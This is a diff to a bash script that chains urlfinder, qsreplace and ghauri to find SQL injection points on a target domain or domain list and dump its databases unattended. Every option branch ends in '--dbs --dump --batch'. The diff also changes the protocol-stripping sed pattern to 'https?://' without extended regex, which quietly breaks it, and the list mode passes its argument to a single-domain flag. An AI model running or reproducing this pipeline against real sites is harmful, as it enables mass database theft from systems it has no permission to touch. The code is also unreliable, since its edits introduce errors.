@@ -69,31 +69,31 @@ fi
 # Single domain
 # all vulnerability
 if [[ "$1" == "-d" && "$3" == "-all" ]]; then
-    domain_Without_Protocol=$(echo "$2" | sed 's,http://,,;s,https://,,')
+    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
     urlfinder -d "$domain_Without_Protocol" -fs fqdn -all  | grep -aE '\.(php|asp|aspx|jsp|cfm)' | qsreplace "SQLI" | grep -a "SQLI" | anew > sqli.txt;ghauri -m sqli.txt --technique=BEST --random-agent --confirm --force-ssl --dbs --dump --batch
 fi
 
 # All Blind
 if [[ "$1" == "-d" && "$3" == "-b" ]]; then
-    domain_Without_Protocol=$(echo "$2" | sed 's,http://,,;s,https://,,')
+    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
     urlfinder -d "$domain_Without_Protocol" -fs fqdn -all  | grep -aE '\.(php|asp|aspx|jsp|cfm)' | qsreplace "SQLI" | grep -a "SQLI" | anew > sqli.txt;ghauri -m sqli.txt --technique=BT --random-agent --confirm --force-ssl --dbs --dump --batch
 fi
 
 # Error based
 if [[ "$1" == "-d" && "$3" == "-e" ]]; then
-    domain_Without_Protocol=$(echo "$2" | sed 's,http://,,;s,https://,,')
+    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
     urlfinder -d "$domain_Without_Protocol" -fs fqdn -all  | grep -aE '\.(php|asp|aspx|jsp|cfm)' > sqli.txt;ghauri -m sqli.txt --technique=E --random-agent --confirm --force-ssl --dbs --dump --batch
 fi
 
 # Time based
 if [[ "$1" == "-d" && "$3" == "-t" ]]; then
-    domain_Without_Protocol=$(echo "$2" | sed 's,http://,,;s,https://,,')
+    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
     urlfinder -d "$domain_Without_Protocol" -fs fqdn -all  | grep -aE '\.(php|asp|aspx|jsp|cfm)' | qsreplace "SQLI" | grep -a "SQLI" | anew > sqli.txt;ghauri -m sqli.txt --technique=T --random-agent --confirm --force-ssl --dbs --dump --batch
 fi
 
 # Boolean based
 if [[ "$1" == "-d" && "$3" == "-bb" ]]; then
-    domain_Without_Protocol=$(echo "$2" | sed 's,http://,,;s,https://,,')
+    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
     urlfinder -d "$domain_Without_Protocol" -fs fqdn -all  | grep -aE '\.(php|asp|aspx|jsp|cfm)' | qsreplace "SQLI" | grep -a "SQLI" | anew > sqli.txt;ghauri -m sqli.txt --technique=B --random-agent --confirm --force-ssl --dbs --dump --batch
 fi
 
@@ -102,30 +102,30 @@ fi
 # Multi domain
 # all vulnerability
 if [[ "$1" == "-l" && "$3" == "-all" ]]; then
-    domain_Without_Protocol=$(echo "$2" | sed 's,http://,,;s,https://,,')
+    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
     urlfinder -d "$domain_Without_Protocol" -all  | grep -aE '\.(php|asp|aspx|jsp|cfm)' | qsreplace "SQLI" | grep -a "SQLI" | anew > sqli.txt;ghauri -m sqli.txt --technique=BEST --random-agent --confirm --force-ssl --dbs --dump --batch
 fi
 
 # All Blind
 if [[ "$1" == "-l" && "$3" == "-b" ]]; then
-    domain_Without_Protocol=$(echo "$2" | sed 's,http://,,;s,https://,,')
+    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
     urlfinder -d "$domain_Without_Protocol" -all  | grep -aE '\.(php|asp|aspx|jsp|cfm)' | qsreplace "SQLI" | grep -a "SQLI" | anew > sqli.txt;ghauri -m sqli.txt --technique=BT --random-agent --confirm --force-ssl --dbs --dump --batch
 fi
 
 # Error based
 if [[ "$1" == "-l" && "$3" == "-e" ]]; then
-    domain_Without_Protocol=$(echo "$2" | sed 's,http://,,;s,https://,,')
+    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
     urlfinder -d "$domain_Without_Protocol" -all  | grep -aE '\.(php|asp|aspx|jsp|cfm)' > sqli.txt;ghauri -m sqli.txt --technique=E --random-agent --confirm --force-ssl --dbs --dump --batch
 fi
 
 # Time based
 if [[ "$1" == "-l" && "$3" == "-t" ]]; then
-    domain_Without_Protocol=$(echo "$2" | sed 's,http://,,;s,https://,,')
+    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
     urlfinder -d "$domain_Without_Protocol" -all  | grep -aE '\.(php|asp|aspx|jsp|cfm)' | qsreplace "SQLI" | grep -a "SQLI" | anew > sqli.txt;ghauri -m sqli.txt --technique=T --random-agent --confirm --force-ssl --dbs --dump --batch
 fi
 
 # Boolean based
 if [[ "$1" == "-l" && "$3" == "-bb" ]]; then
-    domain_Without_Protocol=$(echo "$2" | sed 's,http://,,;s,https://,,')
+    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
     urlfinder -d "$domain_Without_Protocol" -all  | grep -aE '\.(php|asp|aspx|jsp|cfm)' | qsreplace "SQLI" | grep -a "SQLI" | anew > sqli.txt;ghauri -m sqli.txt --technique=B --random-agent --confirm --force-ssl --dbs --dump --batch
 fi
